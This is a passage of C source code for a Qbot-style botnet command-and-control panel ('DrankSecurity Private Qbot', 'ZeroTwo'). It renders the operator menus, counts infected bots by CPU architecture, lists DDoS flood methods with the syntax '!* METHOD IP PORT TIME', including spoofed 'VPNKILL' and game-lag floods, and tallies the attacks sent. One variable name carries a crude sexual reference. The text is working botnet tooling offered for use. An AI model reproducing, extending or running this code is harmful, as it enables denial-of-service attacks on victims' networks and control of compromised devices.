		if(send(thefd, elephantpenisstuckinakitten6, strlen(elephantpenisstuckinakitten6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten7, strlen(elephantpenisstuckinakitten7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten8, strlen(elephantpenisstuckinakitten8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten9, strlen(elephantpenisstuckinakitten9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten10, strlen(elephantpenisstuckinakitten10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten11, strlen(elephantpenisstuckinakitten11), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten12, strlen(elephantpenisstuckinakitten12), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten13, strlen(elephantpenisstuckinakitten13), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten14, strlen(elephantpenisstuckinakitten14), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten15, strlen(elephantpenisstuckinakitten15), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten16, strlen(elephantpenisstuckinakitten16), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
 
   		char reaperline   [5000];
		char reapersline2   [5000];
		char reapersline3   [5000];
		char reapersline4   [5000];
		char reapersline5   [5000];
		char reapersline6   [5000];
		char reapersline7   [5000];
		char reapersline8   [5000];
		char reapersline9   [5000];
		char reaperline0   [5000];
		char reaperline1   [5000];
		char reaperline2   [5000];
		char reaperline3   [5000];
		char reaperline4   [5000];
		char reaperline5   [5000];
		char reaperline6   [5000];
		
  sprintf(reaperline,   "\e[0;35m                      ,____              \r\n");
  sprintf(reapersline2,   "\e[0;35m                       |---.\\           \r\n");
  sprintf(reapersline3,   "\e[0;35m               ___     |    `            \r\n");
  sprintf(reapersline4,   "\e[0;35m              / .-\\  ./=)               \r\n");
  sprintf(reapersline5,   "\e[0;35m             |  | |_/\\/|                \r\n");
  sprintf(reapersline6,   "\e[0;35m             ;  |-;| /_|                 \r\n");
  sprintf(reapersline7,   "\e[0;35m            / \\_| |/ \\ |               \r\n");
  sprintf(reapersline8,   "\e[0;35m           /      \\/\\( |               \r\n");
  sprintf(reapersline9,   "\e[0;35m           |   /  |` ) |                 \r\n");
  sprintf(reaperline0,  "\e[0;35m           /   \\ _/    |                \r\n");
  sprintf(reaperline1,  "\e[0;35m          /--._/  \\    |                \r\n");
  sprintf(reaperline2,  "\e[0;35m          `/|)    |    /                 \r\n");
  sprintf(reaperline3,  "\e[0;35m            /     |   |                  \r\n");
  sprintf(reaperline4,  "\e[0;35m          .'      |   |                  \r\n");
  sprintf(reaperline5,  "\e[0;35m         /         \\  |                 \r\n");
  sprintf(reaperline6,  "\e[0;35m        (_.-.__.__./  /                  \r\n");

		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
		if(send(thefd, reaperline, strlen(reaperline), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline2, strlen(reapersline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline3, strlen(reapersline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline4, strlen(reapersline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline5, strlen(reapersline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline6, strlen(reapersline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline7, strlen(reapersline7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline8, strlen(reapersline8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reapersline9, strlen(reapersline9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reaperline0, strlen(reaperline0), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reaperline1, strlen(reaperline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reaperline2, strlen(reaperline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reaperline3, strlen(reaperline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reaperline4, strlen(reaperline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reaperline5, strlen(reaperline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, reaperline6, strlen(reaperline6), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
        pthread_create(&title, NULL, &titleWriter, sock);
       
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end;
        char loginb1  [5000];
        char loginb2  [5000];
        char loginb3  [5000];
        char loginb4  [5000];
        char loginb5  [5000];
        char loginb6  [5000];
        char loginb7  [5000];
        char loginb8  [5000];
        char loginb9  [5000];
        char loginb10  [5000];
        char loginb11  [5000];



                sprintf(loginb1, "\e[0;35m\r\n");
                sprintf(loginb2, "\x1b[0;35m                         ╔╦╗┬─┐┌─┐┌┐┌┬┌─╔═╗┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬      \r\n");
                sprintf(loginb3, "\x1b[0;35m                          ║║├┬┘├─┤│││├┴┐╚═╗├┤ │  │ │├┬┘│ │ └┬┘      \r\n");
                sprintf(loginb4, "\x1b[1;30m                         ═╩╝┴└─┴ ┴┘└┘┴ ┴╚═╝└─┘└─┘└─┘┴└─┴ ┴  ┴       \r\n");
                sprintf(loginb5,  "\x1b[0;35m                 ╔═══════════════════════════════════════════════╗\e[37m\r\n");
	        sprintf(loginb6,  "\x1b[0;35m                 ║     \x1b[0;36mWelcome To The start Screen Of ZeroTwo\x1b[0;35m    ║\e[37m\r\n");
	        sprintf(loginb7,  "\x1b[0;35m                 ║  \x1b[0;36m Powered By DrankSecurityAPI,RanBy @ovh.de\x1b[0;35m   ║\e[37m\r\n");
	        sprintf(loginb8,  "\x1b[0;35m                 ╚═══════════════════════════════════════════════╝\e[37m\r\n");  
                sprintf(loginb9,  "\e[0;36m                             [+] Type HELP For Menu! [+]\e[37m\r\n"); 
                sprintf(loginb10, "\e[0;35m                             MOTD: %s\r\n", motd);
                sprintf(loginb11, "\e[0;35m\r\n");
                

                if(send(thefd, loginb1, strlen(loginb1), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb2, strlen(loginb2), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb3, strlen(loginb3), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb4, strlen(loginb4), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb5,  strlen(loginb5),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb6, strlen(loginb6),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb7),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb8),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb9),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb10),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb11),  MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
if(strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "count") || strstr(buf, "COUNT")) {
            char synpur1[128];
            char synpur2[128];
            char synpur3[128];
            char synpur4[128];
            char synpur5[128];
            char synpur6[128];
            char synpur7[128];
            char synpur8[128];

            if(x86Connected() != 0) 
            {
                sprintf(synpur1,"\e[0;35mx86:  \e[1;36m[%d]\r\n",     x86Connected());
                if(send(thefd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
            }
            if(armConnected() != 0)
            {
                sprintf(synpur2,"\e[0;35mArm7:  \e[1;36m[%d] \e[0;35m\r\n",     armConnected());
                if(send(thefd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mipsConnected() != 0)
            {
                sprintf(synpur3,"\e[0;35mMips:  \e[1;36m[%d] \e[0;35m\r\n",     mipsConnected());
                if(send(thefd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mpslConnected() != 0)
            {
                sprintf(synpur4,"\e[0;35mMpsl:  \e[1;36m[%d] \e[0;35m\r\n",     mpslConnected());
                if(send(thefd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
            }
            if(ppcConnected() != 0)
            {
                sprintf(synpur5,"\e[0;35mPpc:  \e[1;36m[%d] \e[0;35m\r\n",     ppcConnected());
                if(send(thefd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
            }
            if(spcConnected() != 0)
            {
                sprintf(synpur6,"\e[0;35mSpc:  \e[1;36m[%d] \e[0;35m\r\n",     spcConnected());
                if(send(thefd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
            }
            if(unknownConnected() != 0)
            {
                sprintf(synpur7,"\e[0;35mUnknow: \e[1;36m[%d] \e[0;35m\r\n",  unknownConnected());
                if(send(thefd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
            }
               sprintf(synpur8, "\e[0;35mTotal: \e[1;36m [%d] \e[0;35m\r\n",  clientsConnected());
               if(send(thefd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;
            
                while(1) {
                if(send(thefd, "\x1b[0;35m--->  \x1b[0;35m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
        }

        
        if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?") || strstr(buf, "helpme") || strstr(buf, "Help")) {
		pthread_create(&title, NULL, &titleWriter, sock);
		char help1  [5000];
		char help2  [5000];
		char help3  [5000];
		char help4  [5000];
		char help5  [5000];
		char help6  [5000];
		char help7  [5000];
		char help8  [5000];
		char help9  [5000];
		char help10 [5000];


                sprintf(help1,   "\e[0;35m ╔═════════════════\e[0;35m═════════════════╗\e[0;35m\r\n");
	        sprintf(help2,   "\e[0;35m ║ \e[1;36mBOTS    | Shows Bot Count        \e[0;35m║\e[0;35m\r\n");
	        sprintf(help3,   "\e[0;35m ║ \e[1;36mSPOOF   | Shows Spoofed Methods  \e[0;35m║\e[0;35m\r\n");
	        sprintf(help4,   "\e[0;35m ║ \e[1;36mCLEAR   | Clears The Screen      \e[0;35m║\e[0;35m\r\n");
	        sprintf(help5,   "\e[0;35m ║ \e[1;36mMETHODS | Shows Methods          \e[0;35m║\e[0;35m\r\n");
                sprintf(help6,   "\e[0;35m ║ \e[1;36mSTATS   | Attacks Live Log       \e[0;35m║\e[0;35m\r\n");
                sprintf(help7,   "\e[0;35m ╚═════════════════\e[0;35m═════════════════╝\e[0;35m\r\n");

                
		if(send(thefd, help1,  strlen(help1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help2,  strlen(help2),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help3,  strlen(help3),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help4,  strlen(help4),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help5,  strlen(help5),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help6,  strlen(help6),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help7,  strlen(help7),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help8,  strlen(help8),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help9,  strlen(help9),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, help10,  strlen(help10),  MSG_NOSIGNAL) == -1) goto end;
                }

          
if(strstr(buf, "METHODS") || strstr(buf, "methods") || strstr(buf, "attack") || strstr(buf, "ATTACK")) 
        {
                char method1  [5000];
                char method2  [5000];
                char method3  [5000];
                char method4  [5000];
                char method5  [5000];
                char method6  [5000];
                char method7  [5000];
                char method8  [5000];
                char method9  [5000];
                char method10 [5000];
                char method11 [5000];
                char method12 [5000];
                char method13 [5000];
                char method14 [5000];
                char method15 [5000];
                char method16 [5000];
                char method17 [5000];
                char method18 [5000];


            sprintf(method1,  "\e[0;35m    ╔═══════════════════════════════════╗  \r\n"); 
            sprintf(method2,  "\e[0;35m    ║ \e[0;35m\e[0;35m[+] \e[1;36mDrankSecurity Net Methods \e[0;35m[+]\e[0;35m ║\r\n");
            sprintf(method3,  "\e[0;35m╔══════════════════════════════════════════════╗\x1b[0m\r\n");
            sprintf(method4,  "\e[0;35m║ UDP     \e[0;35m- \e[1;36m !* UDP    IP PORT TIME 32 1350 10 \e[0;35m║\x1b[0m\r\n");
            sprintf(method5,  "\e[0;35m║ TCP     \e[0;35m- \e[1;36m !* TCP    IP PORT TIME 32 all 0 10\e[0;35m║\x1b[0m\r\n");
            sprintf(method6,  "\e[0;35m║ VSE     \e[0;35m- \e[1;36m !* VSE    IP PORT TIME 32 1460 10 \e[0;35m║\x1b[0m\r\n");
            sprintf(method7,  "\e[0;35m║ HEX     \e[0;35m- \e[1;36m !* HEX    IP PORT TIME 1453       \e[0;35m║\x1b[0m\r\n");
            sprintf(method8,  "\e[0;35m║ RAW     \e[0;35m- \e[1;36m !* RAW    IP PORT TIME            \e[0;35m║\x1b[0m\r\n");
            sprintf(method9,  "\e[0;35m║ NFO     \e[0;35m- \e[1;36m !* NFO    IP PORT TIME 1460       \e[0;35m║\x1b[0m\r\n");
            sprintf(method10, "\e[0;35m║ OVH     \e[0;35m- \e[1;36m !* OVH    IP PORT TIME 200        \e[0;35m║\x1b[0m\r\n");
            sprintf(method11, "\e[0;35m║ RIP     \e[0;35m- \e[1;36m !* RIP    IP PORT TIME 1024       \e[0;35m║\x1b[0m\r\n");
            sprintf(method12, "\e[0;35m║ RHEX    \e[0;35m- \e[1;36m !* RHEX   IP PORT TIME            \e[0;35m║\x1b[0m\r\n");
	    sprintf(method13, "\e[0;35m║ GAME    \e[0;35m- \e[1;36m !* GAME   IP PORT TIME            \e[0;35m║\x1b[0m\r\n");
	    sprintf(method14, "\e[0;35m║ KISS    \e[0;35m- \e[1;36m !* KISS   IP PORT TIME            \e[0;35m║\x1b[0m\r\n");
            sprintf(method15, "\e[0;35m║ CLAP    \e[0;35m- \e[1;36m !* CLAP   IP PORT TIME            \e[0;35m║\x1b[0m\r\n");
            sprintf(method16, "\e[0;35m║ JUNK    \e[0;35m- \e[1;36m !* JUNK   IP PORT TIME            \e[0;35m║\x1b[0m\r\n");
            sprintf(method17, "\e[0;35m║ STOMP   \e[0;35m- \e[1;36m !* STOMP  IP PORT TIME 1024       \e[0;35m║\x1b[0m\r\n");
            sprintf(method18, "\e[0;35m╚══════════════════════════════════════════════╝\x1b[0m\r\n");

                
                if(send(thefd, method1,  strlen(method1),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method2,  strlen(method2),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method3,  strlen(method3),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method4,  strlen(method4),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method5,  strlen(method5),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method6,  strlen(method6),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method7,  strlen(method7),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method8,  strlen(method8),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method9,  strlen(method9),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method10,  strlen(method10),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method11,  strlen(method11),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method12,  strlen(method12),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method13,  strlen(method13),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method14,  strlen(method14),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method15,  strlen(method15),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method16,  strlen(method16),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method17,  strlen(method17),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method18,  strlen(method18),  MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[0;35m---> \x1b[0;35m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;

                }

                if(strstr(buf, "CREDIT")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char creditline1  [5000];
                char creditline2  [5000];
                char creditline3  [5000];
                char creditline4  [5000];
                char creditline5  [5000];

                sprintf(creditline1,  "\x1b[0;35m  ════════════════════════════════════  \r\n");
                sprintf(creditline2,  "\x1b[0;35m ║ \x1b[0;36m  DrankSecurity Private Qbot\x1b[0;35m       ║ \r\n");
                sprintf(creditline3,  "\x1b[0;35m ║ \x1b[0;36m        Created By\x1b[0;35m                 ║ \r\n");
                sprintf(creditline4,  "\x1b[0;35m ║ \x1b[0;36m ErrorLoading&DrankSecurity\x1b[0;35m        ║ \r\n");
                sprintf(creditline5,  "\x1b[0;35m  ════════════════════════════════════   \r\n");
                
                if(send(thefd, creditline1,  strlen(creditline1), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline2,  strlen(creditline2), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline3,  strlen(creditline3), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline4,  strlen(creditline4), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline5,  strlen(creditline5), MSG_NOSIGNAL) == -1) goto end;
                while(1) {
                if(send(thefd, "\x1b[0;35m--->  \x1b[0;35m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
        }

                    if(strstr(buf, "Spoof") || strstr(buf, "spoof") || strstr(buf, "SPOOF") || strstr(buf, "spoofed") || strstr(buf, "SPOOFED")) {
		pthread_create(&title, NULL, &titleWriter, sock);
		char spoofed1  [5000];
		char spoofed2  [5000];
		char spoofed3  [5000];
                char spoofed4  [5000];
		char spoofed5  [5000];
		char spoofed6  [5000];
                char spoofed7  [5000];
		char spoofed8  [5000];
		char spoofed9  [5000];
                char spoofed10  [5000];
		char spoofed11  [5000];
		char spoofed12  [5000];
                char spoofed13  [5000];
		char spoofed14  [5000];
		char spoofed15  [5000];
                char spoofed16  [5000];
		char spoofed17  [5000];
		char spoofed18  [5000];
                char spoofed19  [5000];

            sprintf(spoofed1,  "\e[0;0;35m╔═══════════════════╗\e[0m\r\n");
            sprintf(spoofed2,  "\e[1;0;35m║\e[1;36m     HOME METHODS  \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed3,  "\e[0;0;35m║\e[1;36m NTP               \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed4,  "\e[0;0;35m║\e[1;36m VSE               \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed5,  "\e[0;0;35m║\e[1;36m RIP               \e[0;0;35m║\e[0m\r\n");
	        sprintf(spoofed6,  "\e[0;0;35m║\e[1;36m CLDAP             \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed7,  "\e[0;0;35m║\e[1;36m    VPN METHODS    \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed8,  "\e[0;0;35m║\e[1;36m NFOV2             \e[0;0;35m║\e[0m\r\n");
	        sprintf(spoofed9,  "\e[0;0;35m║\e[1;36m VPNKILL           \e[0;0;35m║\e[0m\r\n");
	        sprintf(spoofed10, "\e[0;0;35m║\e[1;36m OVHKISS           \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed11, "\e[0;0;35m║\e[1;36m HOTSPOTS          \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed12, "\e[0;0;35m║\e[1;36m TCPBYPASS         \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed13, "\e[0;0;35m║\e[1;36m UDPBYPASSV3       \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed14, "\e[0;0;35m║\e[1;36m    GAME METHODS   \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed15, "\e[0;0;35m║\e[1;36m 2KDROP            \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed16, "\e[0;0;35m║\e[1;36m FNLAG             \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed17, "\e[0;0;35m║\e[1;36m    HOW TO SEND    \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed18, "\e[0;0;35m║\e[1;36m ! SPOOF           \e[0;0;35m║\e[0m\r\n");
            sprintf(spoofed19, "\e[0;0;35m╚═══════════════════╝\e[0m\r\n");

                
		if(send(thefd, spoofed1,  strlen(spoofed1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, spoofed2,  strlen(spoofed2),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, spoofed3,  strlen(spoofed3),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed4,  strlen(spoofed4),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed5,  strlen(spoofed5),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed6,  strlen(spoofed6),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed7,  strlen(spoofed7),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed8,  strlen(spoofed8),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed9,  strlen(spoofed9),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed10,  strlen(spoofed10),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed11,  strlen(spoofed11),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed12,  strlen(spoofed12),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed13,  strlen(spoofed13),  MSG_NOSIGNAL) == -1) goto end;  
                if(send(thefd, spoofed14,  strlen(spoofed14),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed15,  strlen(spoofed15),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed16,  strlen(spoofed16),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed17,  strlen(spoofed17),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed18,  strlen(spoofed18),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, spoofed19,  strlen(spoofed19),  MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[0;35m---> \x1b[0;35m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;

                }
                 if(strstr(buf, "cls") || strstr(buf, "clear") || strstr(buf, "CLEAR") || strstr(buf, "CLS"))  
        {
        char loginb1  [5000];
        char loginb2  [5000];
        char loginb3  [5000];
        char loginb4  [5000];
        char loginb5  [5000];
        char loginb6  [5000];
        char loginb7  [5000];
        char loginb8  [5000];
        char loginb9  [5000];
        char loginb10  [5000];
        char loginb11  [5000];
        				send(thefd, "\x1b[1A\x1b[2J\x1b[1;1H", strlen("\x1b[1A\x1b[2J\x1b[1;1H"), MSG_NOSIGNAL);

                sprintf(loginb1, "\e[0;35m\r\n");
                sprintf(loginb2, "\x1b[0;35m                         ╔╦╗┬─┐┌─┐┌┐┌┬┌─╔═╗┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬      \r\n");
                sprintf(loginb3, "\x1b[0;35m                          ║║├┬┘├─┤│││├┴┐╚═╗├┤ │  │ │├┬┘│ │ └┬┘      \r\n");
                sprintf(loginb4, "\x1b[1;30m                         ═╩╝┴└─┴ ┴┘└┘┴ ┴╚═╝└─┘└─┘└─┘┴└─┴ ┴  ┴       \r\n");
                sprintf(loginb5,  "\x1b[0;35m                 ╔═══════════════════════════════════════════════╗\e[37m\r\n");
	        sprintf(loginb6,  "\x1b[0;35m                 ║     \x1b[0;36mWelcome To The start Screen Of ZeroTwo\x1b[0;35m    ║\e[37m\r\n");
	        sprintf(loginb7,  "\x1b[0;35m                 ║  \x1b[0;36m Powered By DrankSecurityAPI,RanBy @ovh.de\x1b[0;35m   ║\e[37m\r\n");
	        sprintf(loginb8,  "\x1b[0;35m                 ╚═══════════════════════════════════════════════╝\e[37m\r\n");  
                sprintf(loginb9,  "\e[0;36m                             [+] Type HELP For Menu! [+]\e[37m\r\n"); 
                sprintf(loginb10, "\e[0;35m                             MOTD: %s\r\n", motd);
                sprintf(loginb11, "\e[0;35m\r\n");
                

                if(send(thefd, loginb1, strlen(loginb1), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb2, strlen(loginb2), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb3, strlen(loginb3), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb4, strlen(loginb4), MSG_NOSIGNAL) == -1) return;
                if(send(thefd, loginb5,  strlen(loginb5),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb6, strlen(loginb6),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb7),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb8),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb9),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb10),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, loginb7, strlen(loginb11),  MSG_NOSIGNAL) == -1) goto end;
                
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[0;35m---> \x1b[0;35m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;

                }


        if(strstr(buf, "!* STOP"))
        {
        sprintf(botnet, "Succesfully Stopped The FLOOD On Tha Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 


        if(strstr(buf, "!*"))

                {

               if(strstr(buf, "HEX")) {
                hexssent++; // We Are Sending STDHEX Flood!  
                } 
                if(strstr(buf, "RAW")) {
                rawssent++; // We Are Sending UDPFlood!  
                } 
                if(strstr(buf, "UDP")) {
                udpssent++; // We Are Sending UDPFlood!  
                } 
                if(strstr(buf, "RIP")) {
                ripssent++; // We Are Sending RIP Flood!  
                } 
                if(strstr(buf, "OVH")) {
                ovhssent++; // We Are Seding OVH Flood!  
                } 
                if(strstr(buf, "NFO")) {
                nfossent++; // We Are Sending NFO Flood!
                }  
                if(strstr(buf, "CLAP")) {
                clapssent++; // We Are Sending KICK Flood!
                }
                if(strstr(buf, "KISS")) {
                kissssent++; // We Are Sending HAZARD Flood!
                }        
                if(strstr(buf, "JUNK")) {
                junkssent++; // We Are Sending JUNK Flood!
                } 
                if(strstr(buf, "RHEX")) {
                randhexssent++; // We Are Sending RHEX Flood!
                }        
                if(strstr(buf, "GAME")) {
                gamessent++; // We Are Sending GAME Flood!!
                }        
                if(strstr(buf, "STOMP")) {
                stompssent++; // We Are Sending GAME Flood!!
                }        
                if(strstr(buf, "TCP")) {
                tcpssent++; // We Are Sending GAME Flood!!
                }        
                if(strstr(buf, "VSE")) {
                vsessent++; // We Are Sending GAME Flood!!
        
                }

                char attack1[300];
                sprintf(attack1, "\e[0;35mAttack Sent!\r\n");
                if(send(thefd, attack1,  strlen(attack1),  MSG_NOSIGNAL) == -1) goto end;

            }

     if(strstr(buf, "stats") || strstr(buf, "STATS") || strstr(buf, "STAT") || strstr(buf, "stat")) {
             
                char tsv1  [5000];
                char tsv2  [5000];
                char tsv3  [5000];
                char tsv4  [5000];
                char tsv5  [5000];
                char tsv6  [5000];
                char tsv7  [5000];
                char tsv8  [5000];
                char tsv9  [5000];
                char tsv10 [5000];
                char tsv11 [5000];
                char tsv12 [5000];               
                char tsv13 [5000];
                char tsv14 [5000];
                char tsv15 [5000];
                char tsv16 [5000];
                char tsv17 [5000];
                
                sprintf(tsv1,    "\e[1;36m   \e[0;35m\r\n");
                sprintf(tsv2,    "\e[1;36m        [\e[0;35mAttacks Online\e[0;35m]\e[0;35m\r\n");
                sprintf(tsv3,    "\e[1;36m   UDP     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", udpssent);
                sprintf(tsv4,    "\e[1;36m   TCP     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", tcpssent);
                sprintf(tsv5,    "\e[1;36m   VSE     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", vsessent);
                sprintf(tsv6,    "\e[1;36m   HEX     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", hexssent);
                sprintf(tsv7,    "\e[1;36m   GAME    \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", gamessent);
                sprintf(tsv8,    "\e[1;36m   OVH     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", ovhssent);
                sprintf(tsv9,    "\e[1;36m   RAW     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", rawssent);
